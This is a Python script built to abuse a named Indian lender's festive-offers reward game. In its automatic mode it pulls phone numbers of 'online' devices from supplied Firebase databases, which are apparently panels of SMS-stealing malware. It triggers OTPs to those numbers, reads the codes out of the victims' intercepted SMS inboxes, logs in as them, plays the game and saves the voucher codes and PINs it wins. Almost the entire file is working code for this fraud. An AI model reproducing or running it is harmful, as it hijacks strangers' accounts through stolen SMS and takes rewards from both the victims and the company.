#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║   ✦  P-FINCORP AUTOMATED TERMINAL DASHBOARD  ✦                   ║
║   Auto Firebase Scanner & Number Extractor Engine                ║
║   + Manual Single Number Mode                                    ║
╠══════════════════════════════════════════════════════════════════╣
║  LIBRARIES: pip install requests colorama                         ║
╚══════════════════════════════════════════════════════════════════╝
"""

import subprocess
import sys

def _init_env(pkg):
    try:
        __import__(pkg)
    except ImportError:
        print(f"[*] Fetching dependency -> {pkg}")
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", pkg, "-q"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

_init_env("requests")
_init_env("colorama")

import os
import re
import time
import json
import base64
import requests
from colorama import init as _cinit, Fore, Style, Back
_cinit(autoreset=True)

# ══════════════════════════════════════════════════════════════════
#  CONFIGURATION & HEADERS
# ══════════════════════════════════════════════════════════════════
API_ENDPOINT = "https://festive-offers.poonawallafincorp.com/api"

REQ_HEADERS = {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": (
        "Mozilla/5.0 (Linux; Android 14; SM-A546B) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Mobile Safari/537.36"
    ),
    "referer": "https://festive-offers.poonawallafincorp.com/play-and-win",
    "origin": "https://festive-offers.poonawallafincorp.com",
}

PANEL_WIDTH = 68

# ══════════════════════════════════════════════════════════════════
#  TERMINAL STYLING & INTERFACE
# ══════════════════════════════════════════════════════════════════
def print_success(msg): print(f"  {Fore.GREEN}[ + ]{Style.RESET_ALL} {msg}")
def print_error(msg):   print(f"  {Fore.RED}[ ! ]{Style.RESET_ALL} {msg}")
def print_warn(msg):    print(f"  {Fore.YELLOW}[ * ]{Style.RESET_ALL} {msg}")
def print_info(msg):    print(f"  {Fore.CYAN}[ ~ ]{Style.RESET_ALL} {msg}")
def print_dim(msg):     print(f"  {Fore.WHITE}{Style.DIM}{msg}{Style.RESET_ALL}")
def print_divider(color=Fore.BLUE): print(color + "─" * PANEL_WIDTH + Style.RESET_ALL)

def draw_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    print()
    print(Fore.BLUE + "╔" + "═" * (PANEL_WIDTH - 2) + "╗")
    print(Fore.BLUE + "║" + f"{Style.BRIGHT}    ✦  P-FINCORP AUTOMATED FIRESTORE EXTRACTOR  ✦".ljust(PANEL_WIDTH - 2) + Style.RESET_ALL + Fore.BLUE + "║")
    print(Fore.BLUE + "║" + f"{Fore.WHITE}    Engine: Live Firebase Scanner & SMS Reader".ljust(PANEL_WIDTH - 2) + Fore.BLUE + "║")
    print(Fore.BLUE + "╚" + "═" * (PANEL_WIDTH - 2) + "╝" + Style.RESET_ALL)
    print()

def strip_tags(text):
    return re.sub(r"<[^>]+>", "", text or "").strip()

def append_to_file(filepath, text_line):
    try:
        with open(filepath, "a", encoding="utf-8") as file:
            file.write(text_line + "\n")
    except Exception:
        pass

def export_reward(mobile_num, reward_dict):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    reward_type = str(reward_dict.get("type") or "").upper()
    row_data = "\t".join([
        timestamp, mobile_num, reward_type,
        str(reward_dict.get("brand", "Unknown")),
        str(reward_dict.get("rewardCode") or ""),
        str(reward_dict.get("rewardPin") or ""),
        strip_tags(str(reward_dict.get("details", ""))),
        str(reward_dict.get("redemptionUrl") or ""),
        str(reward_dict.get("validityDate") or "")[:10],
    ])
    destination = "p_coupons.txt" if reward_type == "VOUCHER" else "p_deals.txt"
    append_to_file(destination, row_data)
    return destination

# ══════════════════════════════════════════════════════════════════
#  ADVANCED FIREBASE SCANNER & EXTRACTOR ENGINE
# ══════════════════════════════════════════════════════════════════
def clean_base_url(raw_url):
    url = raw_url.strip().rstrip("/")
    if url.endswith("/.json"):
        url = url[:-6]
    return url

def safe_fetch_json(url_path, timeout_sec=8):
    try:
        response = requests.get(url_path, timeout=timeout_sec)
        if response.status_code == 200:
            content = response.json()
            if content and content != "null":
                return content
    except Exception:
        pass
    return None

def extract_phone_digits(raw_input):
    if not raw_input:
        return ""
    digits_only = re.sub(r"\D", "", str(raw_input))
    if len(digits_only) == 12 and digits_only.startswith("91"):
        digits_only = digits_only[2:]
    elif len(digits_only) == 11 and digits_only.startswith("0"):
        digits_only = digits_only[1:]
    if len(digits_only) > 10:
        digits_only = digits_only[-10:]
    if len(digits_only) == 10 and digits_only[0] in "6789":
        return digits_only
    return ""

def scan_firebase_node_for_numbers(firebase_url):
    base_target = clean_base_url(firebase_url)
    discovered_numbers = []
    seen_set = set()

    print_info(f"Scanning Database Target: {base_target}")

    # Check common client/device paths
    for node_key in ["clients", "devices", "users", "Profiles", "Accounts"]:
        data_packet = safe_fetch_json(f"{base_target}/{node_key}.json")
        if isinstance(data_packet, dict) and data_packet:
            for dev_id, info in data_packet.items():
                if not isinstance(info, dict):
                    continue
                # Verify active status
                status_flag = info.get("status") or info.get("online") or info.get("isOnline")
                if status_flag is True or str(status_flag).lower() in ("true", "1", "online", "active"):
                    extracted_ph = ""
                    for field_name in ("mobNo", "mobile", "phoneNumber", "phone", "number"):
                        extracted_ph = extract_phone_digits(info.get(field_name))
                        if extracted_ph:
                            break
                    if extracted_ph and extracted_ph not in seen_set:
                        discovered_numbers.append((extracted_ph, str(dev_id), base_target))
                        seen_set.add(extracted_ph)
            if discovered_numbers:
                print_success(f"Extracted {len(discovered_numbers)} numbers from node [{node_key}]")
                return discovered_numbers

    # Fallback to All_Users device info tree
    for prefix_key in ["All_Users", "All_User"]:
        device_info_json = safe_fetch_json(f"{base_target}/{prefix_key}/DeviceInfo.json")
        if not isinstance(device_info_json, dict):
            continue
        sim_json = safe_fetch_json(f"{base_target}/{prefix_key}/simDetails.json") or {}
        for dev_id, info in device_info_json.items():
            if not isinstance(info, dict):
                continue
            sim_data = sim_json.get(dev_id, {}) if isinstance(sim_json, dict) else {}
            phone_candidate = ""
            for field in ("sim1Number", "sim2Number", "phoneNumber", "number", "phone", "mobile", "mobNo"):
                raw_val = (sim_data.get(field) if isinstance(sim_data, dict) else None) or info.get(field)
                phone_candidate = extract_phone_digits(raw_val)
                if phone_candidate:
                    break
            if phone_candidate and phone_candidate not in seen_set:
                discovered_numbers.append((phone_candidate, str(dev_id), base_target))
                seen_set.add(phone_candidate)
        if discovered_numbers:
            print_success(f"Extracted {len(discovered_numbers)} numbers from [{prefix_key}] structure")
            return discovered_numbers

    print_warn("Standard nodes yielded no targets. Direct target database scan completed.")
    return discovered_numbers

# ══════════════════════════════════════════════════════════════════
#  SMS OTP PARSER & RETRIEVAL ENGINE
# ══════════════════════════════════════════════════════════════════
def fetch_device_sms_logs(base_url, device_id):
    clean_target = clean_base_url(base_url)
    subpaths = [
        f"{clean_target}/messages/{device_id}.json",
        f"{clean_target}/sms/{device_id}.json",
        f"{clean_target}/All_Users/sms/{device_id}.json",
        f"{clean_target}/inbox/{device_id}.json",
        f"{clean_target}/SMS/{device_id}.json",
    ]
    for path in subpaths:
        messages_dict = safe_fetch_json(path)
        if isinstance(messages_dict, dict) and messages_dict:
            return messages_dict
    return {}

def extract_poonawalla_otp(message_text):
    if not message_text:
        return None
    content_str = str(message_text)
    # Target exact format: "Your OTP for accessing the Poonawalla Fincorp Festive Offers is 3088 Valid for 10 minutes."
    match_pattern = re.search(r"poonawalla.*?\botp\w*.*?(\d{4,6})\b", content_str, re.IGNORECASE)
    if match_pattern:
        return match_pattern.group(1)

    # Generic fallback pattern looking for 4-6 digit numeric codes near keywords
    fallback_pattern = re.search(r"\b(\d{4,6})\b", content_str)
    if fallback_pattern and ("poonawalla" in content_str.lower() or "otp" in content_str.lower()):
        return fallback_pattern.group(1)
    return None

def poll_for_target_otp(base_url, device_id, baseline_msg_ids, request_timestamp):
    messages = fetch_device_sms_logs(base_url, device_id)
    if not isinstance(messages, dict) or not messages:
        return None

    current_time = time.time()
    for msg_id, message_data in messages.items():
        if not isinstance(message_data, dict):
            continue

        body_text = (
            message_data.get("body") or message_data.get("text") or
            message_data.get("message") or message_data.get("msg") or ""
        )
        body_string = str(body_text)

        # Strict validation matching Poonawalla sender/content context
        if "poonawalla" not in body_string.lower():
            continue

        extracted_code = extract_poonawalla_otp(body_string)
        if not extracted_code:
            continue

        # Check timestamp fresh window
        msg_timestamp = message_data.get("timestamp") or message_data.get("time") or message_data.get("date")
        parsed_time = None
        if msg_timestamp:
            try:
                parsed_time = float(msg_timestamp)
                if parsed_time > 1e12:
                    parsed_time = parsed_time / 1000.0
            except Exception:
                parsed_time = None

        if parsed_time is not None:
            if parsed_time < (request_timestamp - 10):
                continue
            if (current_time - parsed_time) > 120:
                continue
        elif msg_id in baseline_msg_ids:
            continue

        return {"otp": extracted_code, "raw_snippet": body_string[:60]}
    return None

# ══════════════════════════════════════════════════════════════════
#  API OPERATIONS (POONAWALLA FINCORP)
# ══════════════════════════════════════════════════════════════════
def trigger_otp_request(mobile_number):
    try:
        response = requests.post(
            f"{API_ENDPOINT}/otp/send",
            headers={**REQ_HEADERS, "content-type": "application/json"},
            json={"mobile": mobile_number, "consentTerms": True, "consentCommunication": True},
            timeout=25,
        )
    except requests.RequestException as exc:
        return False, f"network_error:{type(exc).__name__}", 30

    if response.status_code != 200:
        return False, f"http_status_{response.status_code}", 30
    try:
        payload = response.json()
    except ValueError:
        return False, "invalid_json", 30

    if not isinstance(payload, dict) or not payload.get("success"):
        return False, str(payload.get("message") or "rejected")[:60], 30

    inner_data = payload.get("data") if isinstance(payload.get("data"), dict) else {}
    cooldown_sec = int(inner_data.get("resendAvailableInSeconds") or 30)
    return True, "success", cooldown_sec

def confirm_otp_token(mobile_number, otp_code):
    try:
        response = requests.post(
            f"{API_ENDPOINT}/otp/verify",
            headers={**REQ_HEADERS, "content-type": "application/json"},
            json={"mobile": mobile_number, "otp": otp_code, "referrer": "/play-and-win"},
            timeout=25,
        )
    except requests.RequestException as exc:
        return None, f"network_error:{type(exc).__name__}"

    if response.status_code != 200:
        return None, f"http_status_{response.status_code}"
    try:
        payload = response.json()
    except ValueError:
        return None, "invalid_json"

    if isinstance(payload, dict) and payload.get("success"):
        data_node = payload.get("data")
        if isinstance(data_node, dict) and data_node.get("token"):
            return data_node["token"], "success"
        return None, "missing_auth_token"
    return None, str(payload.get("message") or "rejected")[:60]

def execute_game_play(auth_token, game_category="SHUFFLE"):
    try:
        response = requests.post(
            f"{API_ENDPOINT}/game/play",
            headers={**REQ_HEADERS, "content-type": "application/json", "authorization": f"Bearer {auth_token}"},
            json={"gameType": game_category},
            timeout=25,
        )
        res_json = response.json()
        return res_json if isinstance(res_json, dict) else {}
    except Exception:
        return {}

# ══════════════════════════════════════════════════════════════════
#  EXECUTION PIPELINE PER NUMBER  (Firebase Auto Mode)
# ══════════════════════════════════════════════════════════════════
def process_single_target(mobile_number, firebase_url, device_id):
    print_divider(Fore.CYAN)
    print(f"  {Fore.WHITE}{Style.BRIGHT}TARGET: +91{mobile_number}  |  DEVICE ID: {device_id}{Style.RESET_ALL}")
    print_divider(Fore.CYAN)

    # Establish baseline SMS message IDs
    baseline_msgs = fetch_device_sms_logs(firebase_url, device_id)
    baseline_keys = set(baseline_msgs.keys())

    print_info("Dispatching Poonawalla OTP request...")
    sent_ok, fail_reason, wait_timer = trigger_otp_request(mobile_number)
    if not sent_ok:
        print_error(f"OTP Transmission Blocked: {fail_reason}")
        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\totp_failed\t{fail_reason}")
        return "failed"

    print_success(f"OTP successfully transmitted. Polling Firebase device inbox...")
    request_epoch = time.time()

    # Automatic OTP Reader Loop
    retrieved_otp = None
    for attempt_idx in range(1, 6):
        time.sleep(4)
        found_sms = poll_for_target_otp(firebase_url, device_id, baseline_keys, request_epoch)
        if found_sms:
            retrieved_otp = found_sms["otp"]
            print_success(f"OTP Captured from Device Inbox -> [{retrieved_otp}] (Snippet: {found_sms['raw_snippet']})")
            break
        print_warn(f"Polling attempt {attempt_idx}/5: Awaiting incoming SMS sync...")

    if not retrieved_otp:
        print_error("OTP Read Timeout: Target device did not sync SMS payload.")
        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\totp_timeout")
        return "timeout"

    print_info("Authenticating session with verified OTP token...")
    jwt_token, err_msg = confirm_otp_token(mobile_number, retrieved_otp)
    if not jwt_token:
        print_error(f"Session Authentication Rejected: {err_msg}")
        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\tauth_rejected\t{err_msg}")
        return "auth_failed"

    print_success("Session token acquired successfully. Executing game trigger...")
    game_outcome = execute_game_play(jwt_token, "SHUFFLE")

    response_data = game_outcome.get("data") if isinstance(game_outcome, dict) else None
    if not isinstance(response_data, dict):
        response_data = {}
    won_reward = response_data.get("wonOffer") if isinstance(response_data.get("wonOffer"), dict) else {}

    if not game_outcome.get("success"):
        print_error(f"Game Execution Failed: {game_outcome.get('message', 'Unknown Error')}")
        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\tgame_failed")
        return "game_failed"

    if not won_reward:
        print_warn("Session completed successfully, but reward slot returned empty.")
        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\tno_reward")
        return "no_reward"

    # Reward Display Matrix
    reward_brand = str(won_reward.get("brand", "Poonawalla Partner"))
    reward_type = str(won_reward.get("type", "DEAL"))
    reward_code = str(won_reward.get("rewardCode", ""))
    reward_pin = str(won_reward.get("rewardPin", ""))
    reward_details = strip_tags(str(won_reward.get("details", "")))
    reward_url = str(won_reward.get("redemptionUrl", ""))
    valid_date = str(won_reward.get("validityDate", ""))[:10]

    print()
    print(f"  {Back.GREEN}{Fore.BLACK}{Style.BRIGHT}  🎉  REWARD UNLOCKED SUCCESSFULLY  {Style.RESET_ALL}")
    print()
    print(f"  {Fore.CYAN}Brand    :{Style.RESET_ALL} {Style.BRIGHT}{reward_brand}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Category :{Style.RESET_ALL} {reward_type}")
    if reward_details: print(f"  {Fore.CYAN}Offer    :{Style.RESET_ALL} {reward_details}")
    if reward_code:    print(f"  {Fore.GREEN}Code     :{Style.RESET_ALL} {Style.BRIGHT}{reward_code}{Style.RESET_ALL}")
    if reward_pin:     print(f"  {Fore.YELLOW}PIN      :{Style.RESET_ALL} {reward_pin}")
    if valid_date:     print(f"  {Fore.CYAN}Expires  :{Style.RESET_ALL} {valid_date}")
    if reward_url:     print(f"  {Fore.CYAN}Redeem   :{Style.RESET_ALL} {reward_url}")
    print()

    saved_file = export_reward(mobile_number, won_reward)
    print_success(f"Reward record logged locally -> {saved_file}")
    append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\tsuccess\t{reward_code}\t{reward_type}")
    return "won"

# ══════════════════════════════════════════════════════════════════
#  MANUAL SINGLE NUMBER MODE  (Naya — user khud number + OTP daalta hai)
# ══════════════════════════════════════════════════════════════════
def manual_single_mode():
    """
    Manual mode: user khud mobile number + OTP daalta hai.
    Firebase scanner bilkul nahi chalta. Loop nahi hai — ek number per run.
    """
    draw_header()
    print(f"  {Fore.MAGENTA}{Style.BRIGHT}✍️   MANUAL SINGLE NUMBER MODE{Style.RESET_ALL}")
    print_dim("  Firebase scan nahi hoga — aap khud number + OTP daalenge")
    print()

    # ── Step 1: Number lo ──
    try:
        raw_mobile = input(f"  {Fore.CYAN}[ ? ]{Style.RESET_ALL} Mobile number (10 digit, e.g. 9876543210): ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return

    if not raw_mobile:
        print_error("No mobile entered — aborting.")
        return

    # Normalize: strip +91 / 0 prefix
    mobile = re.sub(r"\D", "", raw_mobile)
    if len(mobile) == 12 and mobile.startswith("91"):
        mobile = mobile[2:]
    elif len(mobile) == 11 and mobile.startswith("0"):
        mobile = mobile[1:]

    if len(mobile) != 10 or mobile[0] not in "6789":
        print_error(f"Invalid mobile number: {raw_mobile}  (10 digit, first digit 6/7/8/9)")
        return

    print_info(f"Target: +91{mobile}")
    print()

    # ── Step 2: OTP bhejo ──
    print_info("Dispatching Poonawalla OTP request...")
    sent_ok, fail_reason, cooldown = trigger_otp_request(mobile)
    if not sent_ok:
        print_error(f"OTP Send Failed: {fail_reason}")
        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_otp_failed\t{fail_reason}")
        return

    print_success(f"OTP sent successfully! (resend available in {cooldown}s)")
    print()

    # ── Step 3: User OTP daale ──
    try:
        otp_input = input(f"  {Fore.CYAN}[ ? ]{Style.RESET_ALL} Enter OTP received on phone: ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        print_warn("Aborted before OTP entry.")
        return

    if not otp_input:
        print_error("No OTP entered — aborting.")
        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_otp_empty")
        return

    otp = re.sub(r"\D", "", otp_input)
    if len(otp) < 4 or len(otp) > 8:
        print_error(f"Invalid OTP format: {otp_input} (expected 4-8 digits)")
        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_bad_otp_format")
        return

    # ── Step 4: Verify ──
    print_info("Verifying OTP...")
    jwt_token, err_msg = confirm_otp_token(mobile, otp)
    if not jwt_token:
        print_error(f"Auth Rejected: {err_msg}")
        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_auth_rejected\t{err_msg}")
        return

    print_success("Session token acquired. Playing game...")

    # ── Step 5: Game Play ──
    game_outcome = execute_game_play(jwt_token, "SHUFFLE")

    response_data = game_outcome.get("data") if isinstance(game_outcome, dict) else None
    if not isinstance(response_data, dict):
        response_data = {}
    won_reward = response_data.get("wonOffer") if isinstance(response_data.get("wonOffer"), dict) else {}

    if not game_outcome.get("success"):
        print_error(f"Game Failed: {game_outcome.get('message', 'Unknown Error')}")
        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_game_failed")
        return

    if not won_reward:
        print_warn("Game completed but no reward won.")
        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_no_reward")
        return

    # ── Step 6: Reward display ──
    reward_brand = str(won_reward.get("brand", "Poonawalla Partner"))
    reward_type = str(won_reward.get("type", "DEAL"))
    reward_code = str(won_reward.get("rewardCode", ""))
    reward_pin = str(won_reward.get("rewardPin", ""))
    reward_details = strip_tags(str(won_reward.get("details", "")))
    reward_url = str(won_reward.get("redemptionUrl", ""))
    valid_date = str(won_reward.get("validityDate", ""))[:10]

    print()
    print(f"  {Back.GREEN}{Fore.BLACK}{Style.BRIGHT}  🎉  REWARD UNLOCKED SUCCESSFULLY  {Style.RESET_ALL}")
    print()
    print(f"  {Fore.CYAN}Mobile   :{Style.RESET_ALL} {Style.BRIGHT}+91{mobile}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Brand    :{Style.RESET_ALL} {Style.BRIGHT}{reward_brand}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Category :{Style.RESET_ALL} {reward_type}")
    if reward_details: print(f"  {Fore.CYAN}Offer    :{Style.RESET_ALL} {reward_details}")
    if reward_code:    print(f"  {Fore.GREEN}Code     :{Style.RESET_ALL} {Style.BRIGHT}{reward_code}{Style.RESET_ALL}")
    if reward_pin:     print(f"  {Fore.YELLOW}PIN      :{Style.RESET_ALL} {reward_pin}")
    if valid_date:     print(f"  {Fore.CYAN}Expires  :{Style.RESET_ALL} {valid_date}")
    if reward_url:     print(f"  {Fore.CYAN}Redeem   :{Style.RESET_ALL} {reward_url}")
    print()

    saved_file = export_reward(mobile, won_reward)
    print_success(f"Reward saved → {saved_file}")
    append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile}\tmanual_success\t{reward_code}\t{reward_type}")

    print()
    print_divider(Fore.MAGENTA)
    print(f"  {Fore.GREEN}Manual mode complete. 👋{Style.RESET_ALL}\n")

# ══════════════════════════════════════════════════════════════════
#  FIREBASE AUTO MODE (existing pipeline)
# ══════════════════════════════════════════════════════════════════
def firebase_auto_mode():
    print(f"  {Fore.WHITE}Provide target Firebase Database URLs (Realtime Database endpoints).{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Type 'RUN' on a new line once all URLs have been pasted.{Style.RESET_ALL}")
    print()

    collected_panels = []
    while True:
        try:
            user_input = input(f"  {Fore.BLUE}[ URL Input ]> {Style.RESET_ALL}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if user_input.upper() == "RUN":
            break
        if not user_input:
            if collected_panels:
                break
            continue

        cleaned_url = clean_base_url(user_input)
        if cleaned_url.startswith("http") and cleaned_url not in collected_panels:
            collected_panels.append(cleaned_url)
            print_success(f"Database registered: {cleaned_url}")
        else:
            print_error("Invalid URL format or duplicate entry.")

    if not collected_panels:
        print_error("No target databases provided. Terminating execution.")
        return

    print()
    print_info(f"Initializing automated scan across {len(collected_panels)} database panel(s)...")
    time.sleep(1)

    execution_results = []
    for panel_idx, target_panel in enumerate(collected_panels, 1):
        print()
        print(f"  {Fore.MAGENTA}{Style.BRIGHT}=== SCANNING PANEL [{panel_idx}/{len(collected_panels)}] ==={Style.RESET_ALL}")

        extracted_targets = scan_firebase_node_for_numbers(target_panel)
        if not extracted_targets:
            print_warn("No active online numbers detected in this panel.")
            continue

        print_success(f"Found {len(extracted_targets)} active target node(s). Beginning automated sequence...")

        for mobile, dev_id, db_ref in extracted_targets:
            try:
                outcome = process_single_target(mobile, db_ref, dev_id)
                execution_results.append(outcome)
            except KeyboardInterrupt:
                print_warn("Operation aborted by user request.")
                return
            except Exception as err:
                print_error(f"Pipeline Exception Encountered: {err}")
                execution_results.append("exception")

            time.sleep(2)

    # Summary Report Display
    print()
    print_divider(Fore.MAGENTA)
    print(f"  {Fore.MAGENTA}{Style.BRIGHT}📊  EXECUTION SUMMARY REPORT{Style.RESET_ALL}")
    print_divider(Fore.MAGENTA)

    from collections import Counter
    summary_counter = Counter(execution_results)
    metric_labels = {
        "won": "🎉 Successful Rewards Claimed",
        "timeout": "⏳ OTP Read Timeouts",
        "failed": "📵 Transmission Blocked",
        "auth_failed": "❌ Token Auth Rejected",
        "game_failed": "⚠️ Game Play Error",
        "no_reward": "📦 Empty Reward Slot",
        "exception": "💥 Runtime Exceptions"
    }

    for key_code, count_val in summary_counter.items():
        print(f"  {metric_labels.get(key_code, key_code):32s} {Style.BRIGHT}{count_val}{Style.RESET_ALL}")

    print()
    print_dim("Output archives: p_coupons.txt · p_deals.txt · p_used.txt")
    print_divider(Fore.MAGENTA)
    print(f"  {Fore.GREEN}Process finished successfully. Goodbye! 👋{Style.RESET_ALL}\n")

# ══════════════════════════════════════════════════════════════════
#  MAIN CONTROLLER — MODE SELECTOR
# ══════════════════════════════════════════════════════════════════
def main():
    draw_header()

    print(f"  {Fore.WHITE}{Style.BRIGHT}Select mode:{Style.RESET_ALL}")
    print()
    print(f"  {Fore.BLUE}{Style.BRIGHT}1{Style.RESET_ALL}  🔥  Firebase Auto   "
          f"{Style.DIM}(URL pool → scan → auto OTP poll){Style.RESET_ALL}")
    print(f"  {Fore.BLUE}{Style.BRIGHT}2{Style.RESET_ALL}  ✍️   Manual Single   "
          f"{Style.DIM}(khud number + OTP daalo){Style.RESET_ALL}")
    print()

    mode_input = input(f"  {Fore.CYAN}[ ? ]{Style.RESET_ALL} Choice (1/2, default 2): ").strip()
    mode = mode_input or "2"

    print()
    if mode == "1":
        firebase_auto_mode()
    else:
        manual_single_mode()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n  Execution halted by user.\n")
        sys.exit(0)